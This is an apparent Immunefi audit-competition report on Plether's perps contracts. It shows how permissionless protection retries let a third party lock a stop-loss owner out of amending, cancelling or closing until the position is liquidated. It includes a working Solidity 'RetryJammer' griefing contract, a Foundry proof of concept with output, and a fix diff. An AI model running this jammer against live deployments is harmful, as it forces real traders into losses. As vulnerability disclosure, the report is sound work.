# \#99660 [SC-High] Permissionless protection retries keep a gapped stop-loss out of `Latched`, so its owner cannot amend the close limits or exit in a single call, and the position can be liquidated

**Submitted on Nov 14th 2026 at 17:33:51 UTC by @Cryptor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99660
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief / Intro

A triggered stop-loss whose close fails on the owner's financial ceiling falls back to `Latched`, and the MED-9 fix lets
only the owner amend those ceilings while the protection is `Latched`. `retryPositionProtectionClose` is permissionless
and free, so any address can terminate the live close attempt and queue a fresh one in the same transaction. The
protection then rests in `Triggered` between transactions, where the owner's amendment, cancellation and every ordinary
close revert. In the proof of concept a third-party contract holds a gapped stop-loss in that state for 25 hours while the
price keeps moving, and the position ends in liquidation with 791.52 USDG more loss than the owner's normal recovery.

### Vulnerability Details

#### Background: protection states

A position protection is a stop-loss or take-profit attached to an open position in `PositionProtectionBook`. A trigger
moves an `Armed` protection to `Triggered` and queues a linked close attempt: an ordinary market close that carries the
owner's retained financial ceilings (`_recordCloseAttempt`, `PositionProtectionBook.sol:564-576`). A successful attempt
closes the position. When an attempt fails or expires while the protected position is unchanged, the protection moves to
`Latched` (`handleFailedProtectionAttempt`, `PositionProtectionBook.sol:637-668`). From `Latched`,
`retryPositionProtectionClose` queues a fresh attempt and moves the protection back to `Triggered`
(`PositionProtectionBook.sol:382-406`).

Plether's LONG side profits as the FX-basket mark falls (`CfdTypes.sol:14`), so a long's stop-loss sits above its entry
price and a rising mark moves against it.

#### The recovery path the MED-9 fix provides

The Cecuro audit's MED-9 ("Keepers can retry protection closes without the trader's financial limits") is listed as
Acknowledged, with fix commit 8a2853f and a comment marking it addressed: the protection retains trader-selected
ceilings (execution notional, gross account debit, action charges, explicit fees) and copies them into the initial close
and every permissionless retry. The comment continues: "Only the owner may amend the retained ceilings while protection
is Latched; keepers cannot relax them. [...] Tight limits may prevent execution until conditions improve or the owner
amends them."

A stop-loss is a market close that fires after a threshold is crossed, so a gap past a slippage ceiling is the expected
way for that close to fail. The owner's way out is `amendLatchedPositionProtectionCloseLimits`
(`PositionProtectionBook.sol:315-328`), which reverts unless the protection is exactly `Latched` and the account has no
pending order.

#### Every other exit is closed while a protection exists

- `cancelPositionProtection` accepts only `PendingOpen` or `Armed` (`PositionProtectionBook.sol:331-338`, `_cancel`
  at `:408-428`), and `cancelPositionProtectionAndCommitClose` only `Armed` (`:341-367`).
- An ordinary close is rejected while the account has an active protection: `commitOrder` passes
  `enforceProtectionLock = true` (`router/OrderLiquidationBatchLogic.sol:135`), checked at `:313-315`, which reverts
  with `OrderRouter__ProtectionActive`.
- A failed attempt relatches only while the exact protected position remains, so the position cannot change size to
  leave the protection either.

#### A third party decides which state the protection rests in

`retryPositionProtectionClose` has no caller check and queues a zero-bounty close attempt, which moves the protection to
`Triggered`. The live attempt can be terminated by anyone: executed through `OrderRouter.executeOrder` (it fails on the
retained ceiling and relatches through `OrderRouter.sol:324-329`), or, once its execution window has passed, expired with
empty update data, which needs no oracle payload. Both calls can be made by one contract in one transaction, so the
protection goes `Triggered` to `Latched` to `Triggered` inside a single transaction and is never `Latched` when the
owner's own transaction executes.

The documented recovery therefore fails whenever it is used as the protocol presents it: the owner's amendment is a
single call, and it always meets a `Triggered` protection. The owner can leave only by first terminating the attacker's
live attempt itself and then amending before the attacker's next retry is sequenced, either in one batched transaction or
in two consecutive transactions that the attacker does not separate. No protocol entry point performs both steps.

#### Attack scenario

1. A trader holds a long with a stop-loss at 1.10 and a 0.1% execution-notional ceiling, a normal slippage guard.
2. The stop triggers, and the first post-commit tick gaps to 1.12. The close fails on the ceiling and relatches.
3. An unprivileged contract executes that failing attempt and retries in one transaction. From then on, each time the
   live attempt's execution window passes, it expires the attempt and retries in one transaction.
4. Between the attacker's transactions the owner's amendment reverts with `OrderRouter__ProtectionNotLatched`,
   cancellation reverts with `OrderRouter__ProtectionNotArmed`, and an ordinary close reverts with
   `OrderRouter__ProtectionActive`.
5. The price keeps moving against the position while it cannot be closed, until it is liquidated.

#### Relation to known issues

- MED-9 is listed as Acknowledged, and its fix commit added the owner-only amendment while `Latched`. This report shows
  that fix is incomplete: a third party can keep the protection out of `Latched` indefinitely, so the owner-only
  amendment is never reachable as a single call.
- The "Router and keeper limitations" in the Known Limitations section of `SECURITY.md` (`:1356-1359`) state: "failed
  protection-attempt cleanup is deliberately unpaid; each retry creates a fresh zero-bounty close record. The separate
  trigger reward is paid once on the original trigger. Liveness depends on keepers processing the terminal attempt and
  separately appending a retry, and operators must alert on prolonged `Latched` state without a live child". That covers
  the opposite liveness case, a protection left `Latched` because nobody retries. Here a child is always live, so that
  alert never fires, and the problem is a retry the owner did not want.
- MED-7 (choice of signed price) and MED-30 (no automatic frozen-market trigger) are not involved. The proof uses one
  ordinary trigger and a single gap tick.

### Impact Details

- No single owner call can close the position, cancel the protection or amend its limits while the attacker keeps
  cycling. The proof of concept measures 25 hours (90,037 seconds, 1,476 attacker cycles) with the owner's
  amendment, cancellation and ordinary close reverting at every check.
- The position stays exposed for that whole time. In the proof the mark moves from 1.12 to 1.18 and the position is
  liquidated at 1.25. The owner ends with 17,999.80 USDG instead of the 18,791.32 USDG of the same-state recovery, a
  791.52 USDG (66%) larger loss on a 10,000 USDG position backed by 2,000 USDG of margin.
- The attacker's cost does not depend on the victim's size: about 946,306 gas per cycle, about 1.4 billion gas over 25
  hours (about 0.014 ETH at a 0.01 gwei Arbitrum base fee). The damage scales with the trapped position.

### Severity

Griefing (Medium). The attacker gains nothing, and every owner exit that the protocol offers as a single call fails
for as long as the attacker keeps cycling, which leaves the position exposed until it is liquidated. The damage in the
proof (791.52 USDG on a position with 2,000 USDG of margin) is far above the attacker's gas cost and grows with position
size, while the cost does not. The owner can escape only by terminating the attacker's live attempt and amending before
the next retry lands, which the protocol does not provide as an operation.

### Mitigation

- Let the owner amend the retained ceilings while its own attempt is live (`Triggered` with that attempt as the only
  pending order), applying to the next retry. The Proof of Concept's fix check uses this patch.
- Alternatively, give the owner a priority window after each failed attempt: accept non-owner retries only after the
  protection has been `Latched` for a grace period, or let the owner cancel a `Latched` protection so ordinary closes
  work again.

### References

- `packages/perps/src/PositionProtectionBook.sol:315-328` (owner amendment, `Latched` only, no pending order)
- `packages/perps/src/PositionProtectionBook.sol:331-338`, `:341-367`, `:408-428` (cancellations, `PendingOpen`/`Armed`, and `Armed` only)
- `packages/perps/src/PositionProtectionBook.sol:382-406` (permissionless zero-bounty retry)
- `packages/perps/src/PositionProtectionBook.sol:564-576` (`_recordCloseAttempt`, sets `Triggered`)
- `packages/perps/src/PositionProtectionBook.sol:637-668` (`handleFailedProtectionAttempt`, relatch)
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:135`, `:313-315` (protection lock on ordinary orders)
- `packages/perps/src/OrderRouter.sol:324-329` (failed attempts routed to the relatch hook)
- `packages/perps/src/CfdTypes.sol:14` (LONG profits as the basket mark falls)
- `packages/perps/SECURITY.md:1356-1359` (retry liveness limitation)
- `audits/plether-ai-audit-report-2026-10-26.pdf`, MED-9 (Acknowledged; comment and fix commit 8a2853f)

## Proof of Concept

One test file, added to the frozen commit (`a82d4fef`) with no other change. The output and the fix check below were
produced on a checkout of that commit with no tracked file modified and this file as the only added source. The test extends the repository's own fixture,
`packages/perps/test/perps/spec/trader/PositionProtection.t.sol`, and uses its deployment, actors (`ALICE`, `CAROL`,
`EXECUTION_KEEPER`) and helpers:

- `_open` creates the victim's position by calling the engine as the router, the setup shortcut the repository's own
  protection tests use. Every attack step uses public entry points from unprivileged callers.
- `_params` builds protection parameters with unlimited ceilings, which the test then tightens.
- `_triggerAt` publishes a mock Pyth tick at the trigger price and fires the protection trigger.
- `_mockUniquePythUpdateDataAt` sets the mock Pyth's next unique tick at a chosen publish time.
- `_mockPythUpdateData` advances one block and one second and sets a new mock Pyth tick.

No production source is modified, no `vm.mockCall` targets an in-scope contract, and prices come from the fixture's mock
Pyth contract. The fixture's constants are a 10,000-token position (`POSITION_SIZE`), 2,000 USDG of margin
(`POSITION_MARGIN_ASSETS`), a 1.00 entry mark (`MARK_PRICE`) and a 1.10 long stop-loss (`LONG_STOP_LOSS`). They are not
the release parameters; the lockout does not depend on risk parameters.

### Step-by-step

1. Alice opens a 10,000-token long at 1.00 with 2,000 USDG margin and creates a stop-loss at 1.10 with a 0.1%
   execution-notional ceiling.
2. The trigger fires the stop at 1.10. The first unique tick after the commit is 1.12, so the close fails with
   `ConstraintViolation` (asserted in the control test) and the protection relatches.
3. Control branch: Alice amends her limits, any address retries, and the retry executes at 1.12.
4. Attack branch: `RetryJammer` executes the failing attempt and retries in one transaction. Every time the live attempt's
   window passes, it expires the attempt and retries in one transaction, for 25 hours.
5. Between the attacker's transactions the test makes Alice try to amend, cancel and close; all three revert every time.
6. Halfway through, the mock mark moves to 1.18. After the lockout, a keeper liquidates Alice at 1.25.

### Setup

Save the file as `packages/perps/test/poc/ProtectionAmendLockoutPoC.t.sol` (its relative import expects that directory)
and run from `packages/perps`:

```
forge test --match-path test/poc/ProtectionAmendLockoutPoC.t.sol --match-contract ProtectionAmendLockoutPoC --match-test test_PoC --gas-limit 20000000000 -vv
```

`--match-test test_PoC` selects the two tests of this file; without it the inherited fixture tests run as well. The
raised gas limit is needed only because the attack test performs 1,476 attacker cycles inside one test; each cycle is an
ordinary transaction of about 946,306 gas. The package compiles with `via_ir`, so the test reads the block timestamp and
number with `vm.getBlockTimestamp()` and `vm.getBlockNumber()`.

### Test file

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {PositionProtectionTest} from "../perps/spec/trader/PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

interface IRouterExecute {
    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory);
}

/// @notice Unprivileged third party. Each call terminalizes the protection's live close attempt and queues a fresh one
///         in the same transaction, so the protection never rests in `Latched` between transactions.
contract RetryJammer {
    IRouterExecute internal immutable ROUTER;
    IPositionProtectionActions internal immutable ACTIONS;

    constructor(address router_, address actions_) {
        ROUTER = IRouterExecute(router_);
        ACTIONS = IPositionProtectionActions(actions_);
    }

    /// @dev Executes the live attempt (it fails on the owner's retained ceiling) and immediately retries.
    function executeAndRetry(uint64 orderId, bytes[] calldata data, uint64 protectionId) external returns (uint64) {
        ROUTER.executeOrder(orderId, data);
        return ACTIONS.retryPositionProtectionClose(protectionId);
    }

    /// @dev Expires the live attempt after its deadline (oracle-free) and immediately retries.
    function expireAndRetry(uint64 orderId, uint64 protectionId) external returns (uint64) {
        ROUTER.executeOrder(orderId, new bytes[](0));
        return ACTIONS.retryPositionProtectionClose(protectionId);
    }
}

/// @notice A stop-loss with a 0.1% notional slippage ceiling meets a gap. The owner wants to accept the worse fill, which
///         the MED-9 fix allows only through `amendLatchedPositionProtectionCloseLimits` while the protection is
///         `Latched`. A third party keeps it `Triggered` instead, so every owner exit reverts while the price keeps
///         moving, and the position ends in liquidation. Control: the owner amends once and exits at the gap price.
/// @dev The package compiles with via_ir, which can cache `block.timestamp` and `block.number` across `vm.warp` and
///      `vm.roll`, so this file reads them with `vm.getBlockTimestamp()` and `vm.getBlockNumber()`.
contract ProtectionAmendLockoutPoC is PositionProtectionTest {
    uint256 internal constant GAP_PRICE = 112_000_000; // 1.12: gaps 2% through the 1.10 long stop-loss
    uint256 internal constant DRIFT_PRICE = 118_000_000; // 1.18: later move while the owner is locked out
    uint256 internal constant LIQUIDATION_PRICE = 125_000_000; // 1.25: final move that liquidates the position
    uint256 internal constant LOCKOUT = 25 hours;

    function _gapScenario() internal returns (uint64 protectionId, uint64 attempt, bytes[] memory gapData) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        uint256 stopNotional = (POSITION_SIZE * LONG_STOP_LOSS) / 1e20;
        params.closeLimits.maxExecutionNotionalAssets = stopNotional + stopNotional / 1000;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);

        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        attempt = _triggerAt(protectionId, LONG_STOP_LOSS);
        uint64 commitTime = uint64(vm.getBlockTimestamp());
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 2);
        // First unique tick after the commit: the market has gapped through the stop.
        gapData = _mockUniquePythUpdateDataAt(GAP_PRICE, commitTime + 1, commitTime);
    }

    function _widenedLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _status(uint64 protectionId) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return protectionViews.getPositionProtection(protectionId).status;
    }

    function _sizeOfAlice() internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(ALICE);
    }

    /// @dev Every exit the owner has, attempted between two attacker transactions.
    function _assertOwnerLockedOut(uint64 protectionId) internal {
        assertEq(
            uint8(_status(protectionId)),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "the protection rests in Triggered between attacker transactions"
        );
        PositionProtectionTypes.CloseFinancialLimits memory widened = _widenedLimits();
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, widened);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);
    }

    function test_PoC_control_ownerAmendsAndExitsAtTheGap() public {
        (uint64 protectionId, uint64 attempt, bytes[] memory gapData) = _gapScenario();
        uint256 balanceBefore = clearinghouse.balanceAssets(ALICE);

        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory first = router.executeOrder(attempt, gapData);
        assertEq(uint8(first.status), uint8(OrderV3Types.LifecycleStatus.Failed), "the gap fill breaches the ceiling");
        assertEq(
            uint8(first.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "the failure is the retained financial ceiling"
        );
        assertEq(
            uint8(_status(protectionId)),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "the failed attempt latches"
        );

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _widenedLimits());
        vm.prank(CAROL);
        uint64 retry = protectionActions.retryPositionProtectionClose(protectionId);
        uint64 retryCommitTime = uint64(vm.getBlockTimestamp());
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 2);
        bytes[] memory data = _mockUniquePythUpdateDataAt(GAP_PRICE, retryCommitTime + 1, retryCommitTime);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory second = router.executeOrder(retry, data);
        assertEq(uint8(second.status), uint8(OrderV3Types.LifecycleStatus.Executed), "the amended retry exits");
        assertEq(_sizeOfAlice(), 0, "the owner is flat at the gap price");
        emit log_named_uint("control: owner balance before", balanceBefore);
        emit log_named_uint("control: owner balance after exiting at the gap", clearinghouse.balanceAssets(ALICE));
    }

    function test_PoC_attack_thirdPartyKeepsOwnerFromAmendingUntilLiquidation() public {
        (uint64 protectionId, uint64 attempt, bytes[] memory gapData) = _gapScenario();
        uint256 balanceBefore = clearinghouse.balanceAssets(ALICE);
        RetryJammer jammer = new RetryJammer(address(router), address(protectionActions));

        attempt = jammer.executeAndRetry(attempt, gapData, protectionId);
        uint256 start = vm.getBlockTimestamp();
        uint256 cycles;
        uint256 gasUsed;
        bool drifted;
        while (vm.getBlockTimestamp() < start + LOCKOUT) {
            _assertOwnerLockedOut(protectionId);
            uint64 deadline = router.lifecycleBook().orderTiming(attempt).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            if (!drifted && vm.getBlockTimestamp() >= start + LOCKOUT / 2) {
                _mockPythUpdateData(DRIFT_PRICE);
                drifted = true;
            }
            uint256 g = gasleft();
            attempt = jammer.expireAndRetry(attempt, protectionId);
            gasUsed += g - gasleft();
            cycles++;
        }
        _assertOwnerLockedOut(protectionId);
        assertEq(_sizeOfAlice(), POSITION_SIZE, "the stopped-out position is still open after the lockout");
        emit log_named_uint("attacker cycles", cycles);
        emit log_named_uint("seconds the owner was locked out", vm.getBlockTimestamp() - start);
        emit log_named_uint("average attacker gas per cycle", gasUsed / cycles);

        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        bytes[] memory liqData = _mockPythUpdateData(LIQUIDATION_PRICE);
        vm.prank(EXECUTION_KEEPER);
        router.executeLiquidation(ALICE, liqData);
        assertEq(_sizeOfAlice(), 0, "the trapped position is liquidated");
        emit log_named_uint("attack: owner balance before", balanceBefore);
        emit log_named_uint("attack: owner balance after liquidation", clearinghouse.balanceAssets(ALICE));
    }
}
```

### Output

```
Ran 2 tests for test/poc/ProtectionAmendLockoutPoC.t.sol:ProtectionAmendLockoutPoC
[PASS] test_PoC_attack_thirdPartyKeepsOwnerFromAmendingUntilLiquidation() (gas: 1232492179)
Logs:
  attacker cycles: 1476
  seconds the owner was locked out: 90037
  average attacker gas per cycle: 946306
  attack: owner balance before: 19995800000
  attack: owner balance after liquidation: 17999800000

[PASS] test_PoC_control_ownerAmendsAndExitsAtTheGap() (gas: 3938523)
Logs:
  control: owner balance before: 19995800000
  control: owner balance after exiting at the gap: 18791320000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.23s (2.21s CPU time)
```

### Fix check

With `amendLatchedPositionProtectionCloseLimits` also accepting `Triggered` when the protection's own attempt is the only
pending order, the attack test fails at the owner's first amendment (`next call did not revert as expected`) and the
control still passes. The repository's `PositionProtection.t.sol` passes 103 of 104 tests under that patch; the one
failure is `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry`, which pins the current revert while a
retry is live, the behaviour the patch changes. The source was restored afterwards.

```diff
         StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
-        if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
+        bool latched = protection.status == PositionProtectionTypes.PositionProtectionStatus.Latched;
+        bool ownAttemptLive = protection.status == PositionProtectionTypes.PositionProtectionStatus.Triggered
+            && protection.linkedOrderId != 0;
+        if (!latched && !ownAttemptLive) {
             revert OrderRouter__ProtectionNotLatched();
         }
-        if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
+        if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != (latched ? 0 : 1)) {
             revert OrderRouter__PendingOrdersExist();
         }
```
